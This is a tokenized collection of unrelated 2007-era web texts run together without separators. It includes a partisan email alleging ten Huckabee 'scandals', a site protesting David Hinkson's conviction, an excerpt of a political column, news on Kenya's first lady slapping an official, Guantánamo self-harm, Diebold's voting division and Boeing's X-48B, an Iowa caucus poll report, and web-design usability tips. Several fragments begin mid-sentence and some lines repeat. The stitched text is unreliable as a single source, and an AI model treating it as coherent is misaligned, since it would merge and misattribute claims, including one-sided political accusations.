" Anything that reminds people of his kind of checkered personal past : it 's not good for him , " said Mara Liasson of National Public Radio , but also suggested that the scandal would not be of such concern to the candidate had he responded too it quickly .

Markets Crash across Europe Experts Warn of Stock Market Hysteria
Markets crashed all across Europe Monday , with Germany 's DAX losing 7 percent of its value .
But analysts advise against panic -- in fact , they say , now might be a good time to pick up some cheap stocks .
I received an email from a friend urging me to donate to Mike Huckabee ’s campaign for President , so I pulled together his top 10 scandals and fired them back .
I ’ve added source citations in order to demonstrate that his scandals are not being manufactured by some Swift Boaters with a few websites .
They are well documented , many are on camera , and are cross - referenced by multiple national media outlets .
Forward as needed to the Huckabee boosters in your life .
In no particular order :
Scandal # 1  Huckabee misrepresents his stand on illegal aliens 
He ran Arkansas as a safe haven state for illegal aliens , and favored illegal aliens over US citizens for cut -rate in - state tuition .
Now he ’s claiming he ’s against amnesty when he refused to sign a bill to start deporting illegals .
( Arkansas Journal ) ( Washington Times )
Scandal # 2  Huckabee lied about urging parole of a rapist who raped and murdered again 
He pardoned or commuted sentences on 1,033 criminals while governor .
He urged the parole board to approve parole of many more criminals that were politically difficult to pardon .
One example , Wayne DuMond , went on to kill and rape 2 women after Huckabee personally pressured the parole board to release him 25 years early for a rape conviction .
The Arkansas parole board forwarded Huckabee a letter from one of DuMond ’s prior rape victims urging the governor not to pardon DuMond , and predicting that DuMond would rape and kill again .
Huckabee pushed for the pardon anyway .
Huckabee later denied receiving the letter , and tried to cover it up , according to a former aid who provided the letters .
( Huffington Post ) ( ABC News )
Scandal # 3  Huckabee ’s non-stop abuse of Christianity as a political gimmick 
This “ phone call ” will absolutely turn your stomach , as does his oh - so - subtle floating cross Christmas ad .
Give me a break .
It disgusts me as a Christian , and no doubt frightens non-Christians to see this sort of thing .
Scandal # 4  Huckabee is a pro-war “ Christian ” 
Here ’s a chance to actually put some of Christ ’s sermons ( Blessed are the warmongers ? ) into action .
Instead , he supports continuing the war in Iraq to “ save national honor ” rather than admitting it was a mistake ( no WMD ’s , no al Qaeda ) and withdrawing .
How many more have to die before we “ leave with honor ” ?
Is that the 11th Commandment ?
Maybe it ’ll be as honorable as Korea , Vietnam , Panama , Bosnia , Somalia , Sudan or Serbia …
He has absolutely no idea how foreign policy and militarism connects with the dollar crisis , terrorism , and the coming recession .
This makes him identical to all but Ron Paul out of any of the candidates , but is noteworthy given how bloodthirsty he is for a minister .
Read More Open Letters
Scandal # 5  Huckabee destroyed state files and equipment as he left the Governor ’s Office 
He ordered the payment of $ 25,000 from a state emergency fund to physically destroy the hard drives of his office at the end of his term .
That data belongs to the Office of the Governor , not the man , and a public official should have NO expectation of privacy when carrying out the duties of office on government equipment .
To turn one of the government ’s favorite phrases around “ if you do n’t have anything to hide … ”
So much for rule of law over personal privilege .
We could expect little return to Constitutional guarantees of privacy and transparent government under Huckabee .
Allocating the funds from a state emergency fund earmarked for floods , tornadoes , and natural disasters is fiscally irresponsible , spendthrift , and perhaps illegal .
We should not be surprised if this scandal takes on wings of its own , given all the possible angles .
( Arkansas Democrat Gazette )
Scandal # 6  Ethicsgate  Governor Huckabee was sanctioned 5 times for ethics violations , and had 9 other complaints , none dismissed as frivolous .
He ’s taken practically every gift or favor ever given to him as Arkansas governor , and actively asked for gifts : “ some former Huckabee staff and appointees acknowledged … that Huckabee ’s chief of staff and a cabinet official solicited contributions from staff and appointees for Christmas gifts for the governor . ”
Should n’t it go the other way around ?
The boss buys a small gift for the staff .
What about that old Christian nugget : it ’s better to give than receive .
There is also a very direct correlation between his receipt of gifts and his political appointments .
He even went so far as to set up a wedding registry for him and his wife to receive gifts to decorate their house after they left office .
How completely tacky .
Clearly this guy thinks of public service as serving him , not the other way around .
( MSNBC ) ( Guardian UK )
Scandal # 7  Huckabee wanted to quarantine AIDS patients in 1992 
He was in favor of rounding up AIDS patients for quarantine in 1992  NOT 1985 , but 1992 , 7 years after it was well established that AIDS was not transmitted by casual contact .
This is either a not so subtle “ homos be damned ” pander to the evangelical base , or a display of ignorance so shocking it borders on unbelievable .
This was a full year after Magic Johnson “ mainstreamed ” HIV / AIDS by admitting that he had it .
He would probably have given Magic a pass to play at the Olympics that year .

Scandal # 8  Huckabee refuses to admit when he ’s mistaken or misinformed about current events 
Rather than get informed or admit his lack of knowledge , he lies about his gaffes .
A polite observer will say he was misunderstood , but watch the video and judge for yourself .
See these comments about Pakistan under marital law and the Pakistan immigration “ threat . "
How exactly does a former governor who did n’t even have Secret Service protection get a CIA briefing ?
Who briefed him ?
Where did those numbers come from ?
What ?
Then there ’s this 46 - second gem .
Scandal # 9  Huckabee seriously misrepresents his record on cutting taxes 
He is not really a tax cutter , and in fact , is lined up to be a bigger spender than , well , Bush II .
“ Right now , we spend about 3.9 percent of our GDP on defense , compared with about six percent in 1986 , under President Ronald Reagan .
We need to return to that six percent level . ” ( Foreign Affairs )
Does he realize that ’s $ 300 Billion in additional defense spending , over the $ 500 Billion in on - budget Defense spending ?
That last thing we need is to waste an additional $ 300 Billion on planes and battleships to fight guys with carbines and makeshift bombs .
We need to get out of Iraq and Afghanistan , and follow Ron Paul ’s plan of granting Letters of Marque for the capture of bin Laden .
This sort of policy ignorance is consistent with Huckabee ’s generally misinformed worldview .
It gets better though .
Here is his record on taxes from National Review and Arkansas Democrat - Gazette :
“ According to the Arkansas Democrat - Gazette , the average Arkansas tax burden increased 47 % over Huckabee ’s tenure .
Huckabee supported ( in chronological order ) a sales tax hike ; gas and diesel fuel tax hikes ; another sales tax hike ; a cigarette tax hike ; a nursing home bed tax ; another sales tax hike ; an income surcharge tax ; a tobacco tax hike ; taxes on Internet access ; and higher beer taxes .
Huckabee also oversaw a 50 - percent increase in spending ; happily signed a minimum wage increase and encouraged national Republicans to do the same ; favors a national smoking ban , farm subsidies , and a federally mandated arts and music curriculum ; opposes private school choice ; and employs class - warfare and protectionist language on the campaign trail . ”
( Foreign Affairs ) ( National Review ) ( Arkansas Democrat Gazette )
Scandal # 10  Arkansans like Hillary Clinton better than Huckabee by nearly 4 to 1 
His home state rejects him as a left - leaning , tax and spend , authoritarian Republican .
There ’s no way a leftist Republican will beat a Democrat in the general election .
Leftists will vote for the Democrat offered , and other than some evangelicals and die-hards , Republicans and Independents will stay home .
Huckabee versus any Democrat would be an electoral beating to rival Reagan versus Mondale , except it will be the Dems taking the White House .
He is a Democrats ’ dream candidate to the point that they are calling him the “ Glass Jaw ” because they will break him head to head .
( Drudge Report )
Here ’s Hillary , one of the most despised people in politics , absolutely killing Huckabee in a late 2007 poll ( 35 % to 8 % ) in Arkansas on the heals of out - raising him for bucks in their “ home ” state .
The final word on Huckabee , and more in - depth reading of all his flip - flops , pettiness , gaudiness , and scandalous behavior I leave to one who knows him best .

Site Overview and Purpose
by Roland and David Hinkson
This web site details the events of a citizen who was never convicted of so much as a traffic ticket ultimately being falsely accused of soliciting the murder of federal officials , all because he got on the wrong side of the Federal Government .
As William L. Anderson points out in his article entitled “ Federal Criminal Law : Expediency Over Principle ” , whether or not Scrushy ( ) is guilty , and , takes a back seat to the larger issue of how " justice " is administered in the federal system .
What we see here is that the federal system has become a legal system that exists of the prosecutors , by the prosecutors , and for the prosecutors .
When Rudy Giuliani , then the U.S. attorney for the Southern District of New York , remarked that the Crime Control Act of 1984 tilted the playing field in favor of prosecutors , he was not exaggerating .
A legal system that at its founding was set up as a mechanism to ensure rights of the accused has become a system of guilty pleas and show trials , and is more akin to what Stalin enjoyed in the U.S.S.R. than what George Washington , Thomas Jefferson , and the great William Blackstone helped create more than 200 years ago .
A grave injustice has been done in the case of U.S. v. David R. Hinkson .
If you believe in prayer , pray for David and for the leaders and decision - makers of this country that laws and policies might be changed to offer protection to the innocent .
If you believe in our system of representation , call , write and / or e mail your senator (s ) / representative(s ) and contact the media .
The unspoken truth is that the Clinton machine is not being battle - tested at all by the Democratic primary process .
When Mrs. Clinton accused John Edwards of “ throwing mud ” and “ personally ” attacking her in a sharp policy exchange in one debate , the press did n’t challenge the absurd hyperbole of her claim .
In reality , neither Mr. Edwards nor any other Democratic competitor will ever hit her with the real , personal mud being stockpiled by the right .
But if she ’s getting a bye now , she will not from the Republican standard - bearer , whoever he may be .
Clinton - bashing is the last shared article of faith ( and last area of indisputable G.O.P. competence ) that could yet unite the fractured and dispirited conservative electorate .
The Republicans know this and are so psychologically invested in refighting the Clinton wars that they ’re giddy .
Karl Rove ’s first column for Newsweek last week , “ How to Beat Hillary ( Next ) November , ” proceeded from the premise that her nomination was a done deal .
In the G.O.P. debates through last Thursday , the candidates mentioned the Clintons some 65 times .
Barack Obama ’s name has not been said once .
But much like the Clinton campaign itself , the Republicans have fallen into a trap by continuing to cling to the Hillary - is - inevitable trope .
They have not allowed themselves to think the unthinkable — that they might need a Plan B to go up against a candidate who is not she .
It ’s far from clear that they would remotely know how to construct a Plan B to counter Mr. Obama .
The repeated attempts to fan “ rumors ” that he is a madrassa - indoctrinated Muslim — whether on Fox News or in The Washington Post , where they resurfaced scurrilously on the front page on Thursday — are too demonstrably false to survive endless reruns even in the Swift - boating era .
Part of the Republicans ’ difficulty in countering Mr. Obama , should they have to , is their own cynical racial politics .
For the most part , race has been the dog that has n’t barked in this campaign despite the ( largely ) white press ’s endless fretting about whether the Illinois senator is too white for black voters and too black for white voters .
Most Americans are n’t racist , most Republicans included .
( Those who are wo n’t vote for the Democratic presidential candidate even if it ’s not Mr. Obama . )
But the G.O.P. , by its own doing , is nonetheless saddled with a history that most recently includes “ macaca ” and Katrina , Mr. Bush ’s appearance at Bob Jones University in 2000 and the nonexistent black population of its Congressional delegation .

As the Republican leadership knows , this record is an albatross , driving away not just black voters but crucial white swing voters , too .
Ken Mehlman , the former G.O.P. chairman , and Mr. Rove , as recently as in that Newsweek column , have implored their party to reach out to minorities .
So have Newt Gingrich and Jack Kemp .
But not even conservative leaders of this stature could persuade their party ’s top 2008 presidential contenders to show up for a September debate moderated by Tavis Smiley for PBS at the historically black Morgan State University .
It ’s not because those no -shows are racists ; it ’s because they are defensive and out of touch .
With the notable exception of Mike Huckabee , most of the party ’s candidates have barricaded themselves from African - Americans for so long that they do n’t know how to speak to or about them .
As sure - footed as these Republicans are in attacking the Clintons and Streisand — or in exchanging fire with Al Sharpton and hip - hop moguls — they are strangers to the mainstream multiracial and multicultural America exemplified by an Obama or an Oprah .
NAIROBI , Kenya , Dec. 13 , 2007  --
The first lady of Kenya , Lucy Kibaki , slapped an official across the face in front of hundreds of guests and journalists at a public event Wednesday .
But there will be no film at 11 of this most undiplomatic incident .
In fact , there 's not a single photo or YouTube video to show .
Why ?
Because security officials confiscated the cameras of journalists at the event , forcing them to erase all footage of what 's being called " the slap heard around the world . "
" It 's not everyday that the first lady slaps someone in public , " said Joseph Odindo , group managing editor of Kenya 's Daily Nation newspaper .
" But it was a public event .
Everyone saw it .
Even without pictures we are still able to describe what happened . "
According to the Daily Nation and other local media , the slap occurred at a Kenyan Independence Day celebration after the unnamed official introduced Mrs. Kibaki by the name of " Wambui , " who is widely believed in Kenya to be President Mwai Kibaki 's second wife .
In front of diplomats , journalists and hundreds of guests , Mrs. Kibaki reportedly stood up , walked across the stage and slapped the master of ceremonies before he finished his introduction speech .
Then , according to local media , the president 's security agents gathered all the journalists and forced them to delete any digital photographs and erase all video footage of the incident , an action Odindo called " outrageous . "
" Taking our film is a serious violation of our freedom of press , " Odindo told ABC News .
Odindo said the Nation Media Group , which owns the Kenya 's Daily Nation newspaper , has filed a formal complaint with the country 's Media Council , an advisory board monitoring the Kenyan government 's relations with journalists .
" We think it 's an abuse of power by the security officers .
It happened in full view of the guests and we definitely had the right to be there and film it , " Odindo says .
The incident was not the first time Mrs. Kibaki has been criticized for using violence and squelching the press .
In 2005 , she stormed Nation Media Group offices with her bodyguards and demanded that a reporter who had written a negative article about her be arrested .
When the reporter refused to come forward , she slapped a cameraman filming the confrontation .
The reporter was never arrested and the footage of her outburst was repeatedly aired on Kenyan television .
Government spokesman Dr. Alfred Mutua criticized the first lady 's actions yesterday .
" It was wrong to be called another person 's name , but a name is a name , " Dr. Mutua told ABC News .
" It was wrong of the first lady to behave the way she behaved .
It 's not right .
She 's portraying a very bad image to women in Kenya . "
Mutua said the security agents were just " doing their jobs " in protecting the president and the first lady , but said that the journalists have the right to protest the action .
" The journalists should demand justice in the courts .
They have that right under freedom of the press , " said Dr. Mutua who added that " the person who was slapped should have pressed charges for assault . "
Kenya 's constitution explicitly protects freedom of the press , and is one of the only Sub - Saharan African countries to do so , according to Tom Rhodes , the Africa programming coordinator for the Committee to Protect Journalists .
" Kenya is in the forefront of press freedom in Sub Saharan Africa and any sort of incident like this should be condemned , " said Rhodes .
" The actions of the first lady should be public knowledge . "
Still both Rhodes and Odindo said the censorship on journalists in this case was an " isolated incident . "
Odindo said the paper has been covering the upcoming elections critically for the last five months without any interference from the government , and says he would not be surprised to see a chorus of editorials condemning Mrs. Kibaki 's behavior and the way it was handled .
" I think we have unlimited freedom of the press , " said Odindo .
" It 's a question of how it 's exercised . "
Rhodes sees the confrontation with the journalists as more of a " knee - jerk reaction " by rogue security agents than a sign that the Kenyan government does n't value independent journalism .
" Kenyans have the right to see these pictures ; however it was an isolated incident and does not reflect on Kenya 's press freedom record . "
GUANTÁNAMO BAY , Cuba , Dec. 4  A detainee at the military detention camp here cut his throat with his own fingernail , causing substantial blood loss early last month , but was not at risk of death , military officials said today .
“ He did in fact use a sharpened fingernail , ” Cmdr. Andrew Haynes , the deputy commander of the guard force here , told reporters during a camp tour .
Commander Haynes said there had been four to six incidents of detainees harming themselves in the last two months , a rate that he said was consistent with recent experience .
Those incidents showed that a potentially deadly struggle between detainees and their jailers continues , largely out of public view here .
A detainee committed suicide in May following three others the previous June .
There have also been numerous suicide attempts .
Advocates for detainees describe such acts as signs of desperation borne of indefinite detention and hopelessness .
But camp administrators label them a tactic to draw publicity and provoke criticism of the United States government .

Today we discovered something new .
It ’s not a vodka but a beer this time .
This beer is called “ The Fire Extinguisher ” .
After a short inspection of the bottle there can be found a step - by - step instructions of use , and well , it really can be used according to them to fight with some small fires , look other pictures to see how .
1 . Open the bottle and start drinking .
2. Wait 20 minutes .
3 . You now can fight some fire .

Is it possible that John Borland 's story this week about Diebold employees scrubbing the company 's Wikipedia page was the final straw ?
Not likely .
But today Diebold , a company once known primarily for making safes and ATMs , announced that it has decided to put some distance between it and its beleaguered voting machine division – Diebold Election Systems Inc , ( aka DESI ) , which the company purchased from Global Election Systems in 2002 .
The company said that after failing to find a buyer for its voting machine business , it was changing the name of the division to Premier Election Solutions Inc ( or PESI ) and was giving it more " independence " by establishing a separate board of directors to run it .
Diebold said in a statement that it made the decision in part because of " the rapidly evolving political uncertainties and controversies surrounding state and jurisdiction purchases of electronic voting systems . "
Diebold did not rule out the possibility of later selling part or all of its ownership in the realigned company .
" While we plan to fully support this business for the foreseeable future , we feel a more independent structure should allow it to operate more effectively , " said Thomas W. Swidarski , president and chief executive .
After five years in the voting machine business , the company currently has more than 25,000 optical scan units and more than 126,000 touch - screen voting machines in use around the country .
But it 's long been viewed by analysts that the election division 's repeated bad publicity was bringing the whole company down .
Indeed , negative publicity about the division has led to dips in the company 's stock price , and the announcement today comes after analysts downgraded the Diebold stock earlier this week from " buy " to " hold . "

The prototype , developed by Boeing Phantom Works with cooperation from NASA and the U.S. Air Force Research Laboratory , flew for 31 minutes , reaching an altitude of 7,500 feet .

Boeing is at it again with one of their fantabolous X - designated planes .
The plane flew from NASA 's Dryden Flight Research Center at Edwards Air Force Base in California .
This X - 48B is only the second prototype that Boeing has built and the only one tested in flight ; it was created to test the " structural , aerodynamic and operational efficiencies of the BWB concept , " according to Bob Liebeck , the BWB program manager , especially during take off and landing .

BWB planes do n't have a tail , the wing itself blends into the fuselage , giving more lift and less drag than a traditional circular fuselage .
This means 30 % less fuel consumption than a normal plane and also less noise , both inside and on the ground .
The composite - skinned aircraft uses three turbojet engines that enable it to fly up to 10,000 feet and 120 knots in its low - speed configuration .
This X - 48B prototype is " remotely piloted from a ground control station in which the pilot uses conventional aircraft controls and instrumentation while looking at a monitor fed by a forward - looking camera on the aircraft " making it the coolest RC / Plane and flight simulator videogame in history - in addition to being a kick ass machine , period .
Boeing 's Tom Koehler said to us via email that " the X - 48 B that flew on July 20 is a small - scale unmanned prototype of the BWB concept " Still , it 's quite a feat - and one that will hopefully develop into better , more efficient aircraft in the future .
Who knows , maybe even beyond military uses , this design will find its way into cool commercial airplanes .

Nov. 19 , 2007  --
A growing focus on fresh ideas coupled with lingering doubts about Hillary Clinton 's honesty and forthrightness are keeping the Democratic presidential contest close in Iowa , with Barack Obama in particular mounting a strong race against the national front - runner .
Most Democratic likely voters in Iowa , 55 percent , say they 're more interested in a " new direction and new ideas " than in strength and experience , compared with 49 percent in July -- a help to Obama , who holds a substantial lead among " new direction " voters .
While Clinton still leads on more personal attributes than any of her competitors , just half of Iowa Democrats in the latest ABC News / Washington Post poll believe she 's willing to say what she really thinks -- far fewer than say so of either Obama or John Edwards .
Obama beats her by 2 - 1 as the most honest and trustworthy candidate .
Her advantage on experience , while substantial , has softened since summer .
She has notably less support in Iowa than nationally in trust to handle a variety of specific issues -- on Iraq , for example , Obama now runs evenly with her .
And she 's third in Iowa among men .
Overall , in current preferences , 30 percent in Iowa support Obama , 26 percent Clinton and 22 percent Edwards , with 11 percent for Bill Richardson .
That 's little changed since July ( Edwards - 4 , Obama +3 , both within sampling tolerances , and Clinton unchanged ) .
Among those who say they 're " absolutely certain " to attend a caucus , Obama has 28 percent support , Clinton 26 percent -- again very close , and a contrast to Clinton 's nearly 2 - 1 lead over Obama nationally .
Plenty of open questions remain -- including where preferences wind up at the caucuses six weeks from now and whether or how Iowans ' choices resonate elsewhere .
Clearly there 's room to move : Forty - three percent say there 's a chance they could change their minds by the Jan.
3 caucuses ; 20 percent say there 's a good chance of it .
ENGAGED --
It 's equally clear that these Democrats are highly engaged .
Fifty - three percent of likely caucus - goers are following the race very closely , more than double the level of attention among all Democrats nationally .
Other measures of the up - close - and - personal nature of the Iowa campaign are striking .
Eight in 10 of those likely to attend a Democratic caucus say they 've received a phone call from one or more of the campaigns .
Just more than half have attended a campaign event .
More than four in 10 have visited campaign Web sites .
And a third say they 've personally spoken with one or more candidates , or shaken his or her hand .
In few if any other states is this level of retail politics possible ; low participation is a notable feature of the Iowa caucuses , with just 120,000 Democratic attendees in 2004 .
But involvement this year looks to be especially high :
Six weeks before the 2004 caucus , 34 percent said they 'd attended a campaign event .
That compares with 52 percent now .
TWO RESULTS --
Two notable results underscore vulnerabilities for Clinton that work to Obama 's advantage .
One , as noted , is that just 50 percent believe she 's willing enough to say what she really thinks , vs. three - quarters who say this about Obama and Edwards alike -- fallout , perhaps , from her recent debate performance .
And among the 45 percent who do n't see Clinton as forthright , her support's in the single digits .
Better yet for the Obama camp is that only a third of Iowa Democrats now say " strength and experience " is more important to them in a candidate ; 55 percent instead put more emphasis on " a new direction and new ideas , " which he 's tried to make his trademark .
Among those " new direction " voters , 43 percent prefer Obama , while just 17 percent go for Clinton -- a major component of his support .
Among voters more concerned with strength and experience , 38 percent prefer Clinton , vs. just 12 percent for Obama .
ATTRIBUTES --
But if Clinton is vulnerable on some personal measures , so is Obama -- notably in having " the best experience to be president " in which he runs fourth , behind Clinton , Edwards and Richardson alike .
Still , while just 11 percent pick Obama as having the best experience , the biggest change from July is in the number who pick Clinton in this measure -- 38 percent now , down from 50 percent then .
Obama is within sight of Clinton on another of her main features , an image of strong leadership :
Thirty - two percent call her the strongest leader , vs. 27 percent for Obama ; it was 36 - 23 percent last summer .
And both Obama and Edwards lead Clinton in honesty and trustworthiness , and in empathy , two relative weaknesses for her nationally as well .
Clinton retains her lead in being seen as the most electable candidate , though it 's much less of an advantage in Iowa than nationally .
And few fault her effort :
She also leads as the candidate who 's campaigned hardest in the state .
ISSUES --
As noted , Clinton also has much less of a lead in Iowa than she 's enjoyed nationally in trust to handle a range of specific issues .
Indeed in Iowa she has the edge on just one of six issues tested in this poll , health care .
She and Obama run about evenly in trust to handle four others -- the economy overall , Social Security , Iraq and Iran .
Clinton trails off on a sixth issue , immigration ; on that it 's about an even choice between Obama and Richardson , the governor of New Mexico .
Comparisons to national data are striking .
In an ABC / Post poll early this month , for example , Clinton led Obama by 2 - 1 in trust to handle the situation in Iraq .
In this poll 26 percent of likely caucus - goers pick Obama on that issue -- up by 9 points from July -- while 23 percent take Clinton , down by 6 .
Yet it 's notable , too , that in Iowa none of Clinton 's challengers has a significant lead on any of these .
Separately , Iowa Democrats cite Iraq as the single most important issue in their choice ( 33 percent ) , with health care a close second , cited by 26 percent .
Ten percent say it 's the economy , with all other mentions in the single digits .
( Among Democrats nationally , Iraq is farther out front as the top concern , with the economy alongside health care as No. 2 . )
GROUPS --
A look at candidate preferences among groups fleshes out their campaigns ' support profiles -- crucial as they seek to motivate supporters to turn out for the caucuses .
( One factor -- their supporters ' levels of enthusiasm -- is about even . )
As noted , Clinton has a particular problem in Iowa with men -- just 19 percent support , vs. her 31 percent support among women .
Obama and Edwards alike lead her among men , and Richardson is within sampling error .
Among women , meanwhile , Clinton and Obama run about evenly , compared with a more than 2 - 1 Clinton lead nationally .
( Clinton leads in Iowa among single women , but trails Obama among those who are married . )
Most Iowa Democrats say the fact that Clinton would be the first woman president does n't directly influence their choice ; however among women 19 percent , nearly one in five , say it does make them more likely to support her .
Apart from women , Obama does notably better , and Clinton less well , among independents rather than registered Democrats ( 35 percent of independents support Obama vs. 18 percent for Clinton ) .
That 's potentially a challenge for him because it can be tougher to get independents to turn out .
Similarly , Obama does better among younger Iowans , and also among those who say it 'll be their first caucus ( about a third of all likely caucus - goers ) .
Clinton , however , also does better among first - timers ; she needs their turnout as much as Obama does , or more .
The edge turns to Obama among the most highly educated voters , a reliably high turnout group ; he has 37 percent among those who 've done post - graduate work ( a fifth of all likely caucus - goers ) vs. just 16 percent for Clinton , her weakest education group by far .
Perhaps the largest change in any individual groups has been at Edwards ' expense -- a drop in support among older voters in Iowa , which had been his best group .
Among those age 65 and over , just 18 percent now support him , down from 36 percent in July .
Among seniors -- another normally high - turnout group -- Clinton now leads .
A final change in Iowa , less fortuitous for Clinton , is among political moderates ; her support in this group has slipped to 19 percent , again in third place behind Obama and Edwards .
She does better with liberals , but there are fewer of them .
SAMPLING and TURNOUT -- Turnout matters especially in low - attendance events like caucuses .
This poll was conducted by telephone calls to a random sample of Iowa homes with landline phone service .
Adults identified as likely caucus - goers account for 14 percent of respondents ; the subgroup of those who say they 're certain to attend account for just under 9 percent ( with , as noted , no significant change in results ) .
These compare to turnout in 2004 of 5 percent of the state 's voting - age population .
METHODOLOGY -- This ABC News / Washington
Post poll was conducted by telephone Nov. 14 - 18 , 2007 , among a random sample of 500 Iowan adults likely to vote in the 2008 Democratic presidential caucus .
The results have a 4.5 - point error margin .

Principles Of Good Website Design And Effective Web Design Guidelines
In order to use the principles properly we first need to understand how users interact with websites , how they think and what are the basic patterns of users ' behavior .
How do users think ?
Basically , users ’ habits on the Web are n’t that different from customers ’ habits in a store .
Visitors glance at each new page , scan some of the text , and click on the first link that catches their interest or vaguely resembles the thing they ’re looking for .
In fact , there are large parts of the page they do n’t even look at .
Most users search for something interesting ( or useful ) and clickable ; as soon as some promising candidates are found , users click .
If the new page does n’t meet users ’ expectations , the Back button is clicked and the search process is continued .
Users appreciate quality and credibility .
If a page provides users with high - quality content , they are willing to compromise the content with advertisements and the design of the site .
This is the reason why not - that - well - designed websites with high - quality content gain a lot of traffic over years .
Content is more important than the design which supports it .

Content is more important than the design which supports it .
Users do n’t read , they scan .
Analyzing a web - page , users search for some fixed points or anchors which would guide them through the content of the page .
Users do n’t read , they scan .
Notice how “ hot ” areas abrupt in the middle of sentences .
This is typical for the scanning process .
Analyzing a web - page , users search for some fixed points or anchors which would guide them through the content of the page .
Web users are impatient and insist on instant gratification .
Very simple principle :
If a web - site is n’t able to meet users ’ expectations , then designer failed to get his job done properly and the company loses money .
The higher is the cognitive load and the less intuitive is the navigation , the more willing are users to leave the web - site and search for alternatives .

Users do n’t make optimal choices .
Users do n’t search for the quickest way to find the information they ’re looking for .
Neither do they scan webpage in a linear fashion , going sequentially from one site section to another one .
Instead users satisfice ; they choose the first reasonable option .
As soon as they find a link that seems like it might lead to the goal , there is a very good chance that it will be immediately clicked .
Optimizing is hard , and it takes a long time .
Satisficing is more efficient .

Users follow their intuition .
In most cases users muddle through instead of reading the information a designer has provided .
According to Steve Krug , the basic reason for that is that users do n’t care .
“ If we find something that works , we stick to it .
It does n’t matter to us if we understand how things work , as long as we can use them .
If your audience is going to act like you ’re designing billboard , then design great billboards . ”

If your audience is going to act like you ’re designing billboard , then design great billboards . ”
Users want to have control .
Users want to be able to control their browser and rely on the consistent data presentation throughout the site .
E.g. they do n’t want new windows popping up unexpectedly and they want to be able to get back with a “ Back ” - button to the site they ’ve been before : therefore it ’s a good practice to never open links in new browser windows .
1 . Do n’t make users think
According to Krug ’s first law of usability , the web - page should be obvious and self - explanatory .
When you ’re creating a site , your job is to get rid of the question marks — the decisions users need to make consciously , considering pros , cons and alternatives .
If the navigation and site architecture are n’t intuitive , the number of question marks grows and makes it harder for users to comprehend how the system works and how to get from point A to point B . A clear structure , moderate visual clues and easily recognizable links can help users to find their path to their aim .
Let ’s take a look at an example .
Beyondis.co.uk claims to be “ beyond channels , beyond products , beyond distribution ” .
What does it mean ?
Since users tend to explore web - sites according to the “ F ” - pattern , these three statements would be the first elements users will see on the page once it is loaded .
Although the design itself is simple and intuitive , to understand what the page is about the user needs to search for the answer .
This is what an unnecessary question mark is .
It ’s designer ’s task to make sure that the number of question marks is close to 0 .
The visual explanation is placed on the right hand side .
Just exchanging both blocks would increase usability .
ExpressionEngine uses the very same structure like Beyondis , but avoids unnecessary question marks .
Furthermore , the slogan becomes functional as users are provided with options to try the service and download the free version .
By reducing cognitive load you make it easier for visitors to grasp the idea behind the system .
Once you ’ve achieved this , you can communicate why the system is useful and how users can benefit from it .
People wo n’t use your web site if they can’t find their way around it .
2 . Do n’t squander users ’ patience
In every project when you are going to offer your visitors some service or tool , try to keep your user requirements minimal .
The less action is required from users to test a service , the more likely a random visitor is to actually try it out .
First - time visitors are willing to play with the service , not filling long web forms for an account they might never use in the future .
Let users explore the site and discover your services without forcing them into sharing private data .
It ’s not reasonable to force users to enter an email address to test the feature .
As Ryan Singer — the developer of the 37 Signals team — states , users would probably be eager to provide an email address if they were asked for it after they ’d seen the feature work , so they had some idea of what they were going to get in return .
Stikkit is a perfect example for a user - friendly service which requires almost nothing from the visitor which is unobtrusive and comforting .
And that ’s what you want your users to feel on your web site .
Apparently , Mite requires more .
However the registration can be done in less than 30 seconds — as the form has horizontal orientation , the user does n’t even need to scroll the page .
Ideally remove all barriers , do n’t require subscriptions or registrations first .
A user registration alone is enough of an impediment to user navigation to cut down on incoming traffic .
3. Manage to focus users ’ attention
As web - sites provide both static and dynamic content , some aspects of the user interface attract attention more than others do .
Obviously , images are more eye - catching than the text — just as the sentences marked as bold are more attractive than plain text .
The human eye is a highly non-linear device , and web -users can instantly recognize edges , patterns and motions .
This is why video - based advertisements are extremely annoying and distracting , but from the marketing perspective they perfectly do the job of capturing users ’ attention .
Humanized perfectly uses the principle of focus .
The only element which is directly visible to the users is the word “ free ” which works attractive and appealing , but still calm and purely informative .
Subtle hints provide users with enough information of how to find more about the “ free ” product .
Focusing users ’ attention to specific areas of the site with a moderate use of visual elements can help your visitors to get from point A to point B without thinking of how it actually is supposed to be done .
The less question marks visitors have , the better sense of orientation they have and the more trust they can develop towards the company the site represents .
In other words : the less thinking needs to happen behind the scenes , the better is the user experience which is the aim of usability in the first place .
4. Strive for feature exposure
Modern web designs are usually criticized due to their approach of guiding users with visually appealing 1 - 2 - 3 - done - steps , large buttons with visual effects etc .
But from the design perspective these elements actually are n’t a bad thing .
On the contrary , such guidelines are extremely effective as they lead the visitors through the site content in a very simple and user - friendly way .
Dibusoft combines visual appeal with clear site structure .
The site has 9 main navigation options which are visible at the first glance .
The choice of colors might be too light , though .
Letting the user see clearly what functions are available is a fundamental principle of successful user interface design .
It does n’t really matter how this is achieved .
What matters is that the content is well - understood and visitors feel comfortable with the way they interact with the system .
5 . Make use of effective writing
As the Web is different from print , it ’s necessary to adjust the writing style to users ’ preferences and browsing habits .
Promotional writing wo n’t be read .
Long text blocks without images and keywords marked in bold or italics will be skipped .
Exaggerated language will be ignored .
Talk business .
Avoid cute or clever names , marketing - induced names , company - specific names , and unfamiliar technical names .
For instance , if you describe a service and want users to create an account , “ sign up ” is better than “ start now ! ” which is again better than “ explore our services ” .
Eleven2.com gets directly to the point .
No cute words , no exaggerated statements .
Instead a price : just what visitors are looking for .
An optimal solution for effective writing is to
use short and concise phrases ( come to the point as quickly as possible ) ,
use scannable layout ( categorize the content , use multiple heading levels , use visual elements and bulleted lists which break the flow of uniform text blocks ) ,
use plain and objective language ( a promotion does n’t need to sound like advertisement ; give your users some reasonable and objective reason why they should use your service or stay on your web - site )
6. Strive for simplicity
The “ keep it simple ” - principle ( KIS ) should be the primary goal of site design .
Users are rarely on a site to enjoy the design ; furthermore , in most cases they are looking for the information despite the design .
Strive for simplicity instead of complexity .
From the visitors ’ point of view , the best site design is a pure text , without any advertisements or further content blocks matching exactly the query visitors used or the content they ’ve been looking for .
This is one of the reasons why a user - friendly print - version of web pages is essential for good user experience .
Finch clearly presents the information about the site and gives visitors a choice of options without overcrowding them with unnecessary content .
7 . Do n’t be afraid of the white space
Actually it ’s really hard to overestimate the importance of white space .
Not only does it help to reduce the cognitive load for the visitors , but it makes it possible to perceive the information presented on the screen .
When a new visitor approaches a design layout , the first thing he / she tries to do is to scan the page and divide the content area into digestible pieces of information .
Complex structures are harder to read , scan , analyze and work with .
